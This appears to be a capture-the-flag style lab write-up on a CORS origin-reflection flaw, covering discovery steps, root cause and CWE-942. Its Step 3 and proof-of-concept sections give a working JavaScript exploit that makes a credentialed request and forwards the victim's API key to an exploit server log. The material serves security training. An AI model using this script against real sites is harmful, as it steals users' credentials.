# CORS vulnerability with basic origin reflection

**URL:** https://YOUR-LAB-ID.web-security-academy.net
**Difficulty:** Apprentice
**Vulnerability:** CORS misconfiguration via Origin reflection

---

## Summary

An authenticated endpoint that returns account details, including an API key, reflects whatever
`Origin` header a request sends back as `Access-Control-Allow-Origin`, and also sets
`Access-Control-Allow-Credentials: true`. That combination lets any arbitrary origin make a
credentialed cross-origin request and read the response - defeating the purpose of an origin
allow-list entirely, since the "list" accepts everything.

---

## Discovery and Exploitation

### Step 1

Noticed the account key is fetched via an authenticated AJAX request to `/accountDetails`, and that
the response includes `Access-Control-Allow-Credentials: true`.

### Step 2

Resent the request with an added `Origin: https://example.com` header and observed the response's
`Access-Control-Allow-Origin` echoed that exact value back, confirming unrestricted origin
reflection rather than a fixed allow-list.

### Step 3

Hosted a small script on the exploit server that makes a credentialed cross-origin request to
`/accountDetails` and forwards the response to the exploit server's own logging endpoint:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

### Step 4

Verified the exploit against my own session first (View exploit) and confirmed it landed on the
log endpoint carrying my own account's key, proving the mechanism works before spending a real
delivery.

### Step 5

Delivered the exploit to the simulated victim, retrieved their API key from the exploit server's
access log, and submitted it via the lab's solution-submission prompt to complete the lab.

---

## Proof of Concept

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

---

## Root Cause

The application dynamically reflects the request's `Origin` header into
`Access-Control-Allow-Origin` instead of validating it against a fixed allow-list, while also
enabling `Access-Control-Allow-Credentials`. This lets any external origin issue a credentialed
request and read the authenticated response, exposing sensitive account data cross-origin.

---

## CWE

- **CWE-942: Permissive Cross-domain Policy with Untrusted Domains**
